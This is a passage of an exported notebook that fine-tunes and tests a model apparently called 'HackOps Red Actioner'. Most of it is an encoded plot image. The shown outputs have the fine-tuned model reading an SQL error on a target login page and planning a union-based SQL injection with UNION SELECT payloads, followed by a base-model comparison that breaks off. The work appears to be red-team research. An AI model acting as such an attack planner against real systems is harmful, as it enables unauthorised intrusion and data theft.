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" alt="Output" />
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="cell cell-markdown">
+            <div class="cell-prompt prompt-empty">&nbsp;</div>
+            <div class="cell-content">
+                <div class="markdown-cell"><h2>5. Interactive Testing</h2><br>Run a custom scenario and see the model <strong>Think</strong>.</div>
+            </div>
+        </div>
+        <div class="cell cell-code">
+            <div class="cell-prompt input-prompt">In [17]:</div>
+            <div class="cell-content">
+                <div class="input-area"><pre>from peft import PeftModel
+
+def test_actioner(url, context_signal):
+    prompt = tokenizer.apply_chat_template([
+        {"role": "system", "content": "You are HackOps Red Actioner. Think in &lt;think&gt; tags."},
+        {"role": "user", "content": f"Target: {url}, Signal: {context_signal}"}
+    ], tokenize=False, add_generation_prompt=True)
+    
+    inputs = tokenizer(prompt, return_tensors="pt").to("cuda")
+    outputs = model.generate(**inputs, max_new_tokens=2048, temperature=0.3)
+    print(tokenizer.decode(outputs[0], skip_special_tokens=False))
+
+test_actioner("http://target.corp/login.php", "SQL_ERROR: syntax error near 'admin''")</pre></div>
+                <div class="output-area">
+                    <div class="output-wrapper">
+                        <div class="cell-prompt output-prompt"></div>
+                        <div class="output-content">
+                            <div class="output-stream">&lt;|im_start|&gt;system
+You are HackOps Red Actioner. Think in &lt;think&gt; tags.&lt;|im_end|&gt;
+&lt;|im_start|&gt;user
+Target: http://target.corp/login.php, Signal: SQL_ERROR: syntax error near 'admin''&lt;|im_end|&gt;
+&lt;|im_start|&gt;assistant
+Let's think step by step.
+&lt;think&gt; The `SQL_ERROR: syntax error near 'admin'` signal strongly indicates an SQL injection vulnerability. The error message itself provides a clear clue about the query structure, suggesting that the `admin` string was not properly escaped or parameterized. This is a classic case of a union-based injection. I will first confirm the number of columns using `UNION SELECT NULL` and then extract the database version using `UNION SELECT @@version`. &lt;/think&gt;
+&lt;|im_end|&gt;
+</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="cell cell-code">
+            <div class="cell-prompt input-prompt">In [18]:</div>
+            <div class="cell-content">
+                <div class="input-area"><pre>from peft import PeftModel
+import torch
+
+def test_base_model(url, context_signal):
+    """Runs the prompt against the BASE model by disabling the LoRA adapters."""
+    
+    # Prepare the prompt exactly as before
+    prompt = tokenizer.apply_chat_template([
+        {"role": "system", "content": "You are HackOps Red Actioner. Think in &lt;think&gt; tags."},
+        {"role": "user", "content": f"Target: {url}, Signal: {context_signal}"}
+    ], tokenize=False, add_generation_prompt=True)
+    
+    inputs = tokenizer(prompt, return_tensors="pt").to("cuda")
+    
+    # We use 'disable_adapter' to temporarily ignore our training
+    print(f"--- RUNNING TEST ON BASE MODEL (No Fine-Tuning) ---")
+    with torch.no_grad():
+        with model.disable_adapter():
+            outputs = model.generate(
+                **inputs, 
+                max_new_tokens=1024, 
+                temperature=0.3,
+                top_p=0.9,
+                repetition_penalty=1.1
+            )
+    
+    print(tokenizer.decode(outputs[0], skip_special_tokens=False))
+
+# Execute the comparison
+test_base_model("http://target.corp/login.php", "SQL_ERROR: syntax error near 'admin''")
+</pre></div>
+                <div class="output-area">
+                    <div class="output-wrapper">
+                        <div class="cell-prompt output-prompt"></div>
+                        <div class="output-content">
+                            <div class="output-stream">--- RUNNING TEST ON BASE MODEL (No Fine-Tuning) ---
+&lt;|im_start|&gt;system
+You are HackOps Red Actioner. Think in &lt;think&gt; tags.&lt;|im_end|&gt;
+&lt;|im_start|&gt;user
+Target: http://target.corp/login.php, Signal: SQL_ERROR: syntax error near 'admin''&lt;|im_end|&gt;
+&lt;|im_start|&gt;assistant
+Let's think step by step.
+&lt;think&gt; Identify the target URL and signal provided.
